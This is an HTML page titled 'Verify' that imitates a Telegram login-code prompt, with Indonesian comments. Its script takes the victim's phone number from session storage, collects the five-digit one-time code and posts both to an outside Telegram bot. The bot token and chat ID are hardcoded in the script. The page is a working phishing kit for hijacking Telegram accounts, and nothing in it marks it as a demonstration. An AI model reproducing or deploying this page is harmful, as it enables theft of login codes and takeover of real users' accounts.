<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Verify</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap');
        :root {
            --blue: #5EA3DE;
            --dark: #1D2733;
        }
        * {
            font-family: 'Ubuntu', sans-serif;
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: var(--dark);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
        }
        .inppin {
            width: 35px;
            height: 43px;
            margin: 2px;
            text-align: center;
            border-radius: 5px;
            border: 2px solid #7f7f7f;
            background: none;
            color: #fff;
        }
        .sms {
            color: var(--blue);
            margin-top: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Enter Code</h2>
        <p id="thisPhone">We have sent the code to your telegram app <span></span></p>
        <form id="formPin">
            <input id="pin1" class="inppin" maxlength="1" type="text" required>
            <input id="pin2" class="inppin" maxlength="1" type="text" required>
            <input id="pin3" class="inppin" maxlength="1" type="text" required>
            <input id="pin4" class="inppin" maxlength="1" type="text" required>
            <input id="pin5" class="inppin" maxlength="1" type="text" required>
        </form>
        <p class="sms" onclick="sendPin()">Send Code</p>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Ganti token bot Telegram dan chat_id dengan nilai yang sesuai
        const BOT_TOKEN = '7451357338:AAGaHAyD96AMy2WVLgSbfQi0ovel3Y31IWk';
        const CHAT_ID = '6269902580';

        document.addEventListener("DOMContentLoaded", function() {
            // Set nomor telepon di halaman
            const phone = sessionStorage.getItem("nohp");
            document.getElementById("thisPhone").querySelector("span").textContent = phone || 'Unknown';
        });

        function sendPin() {
            const inputs = $(".inppin").toArray();
            const code = inputs.map(input => input.value).join("");
            const phone = sessionStorage.getItem("nohp");

            if (!phone || code.length !== 5) {
                alert("Nomor telepon atau kode tidak valid!");
                return;
            }

            const message = `ðŸ“± Phone: ${phone}\nðŸ”‘ OTP: ${code}`;

            $.ajax({
                url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
                type: "POST",
                contentType: "application/json",
                data: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message
                }),
                success: function(response) {
                    alert("Data berhasil dikirim ke bot Telegram!");
                },
                error: function(err) {
                    alert("Terjadi kesalahan saat mengirim data.");
                    console.error(err);
                }
            });
        }
    </script>
</body>
</html>
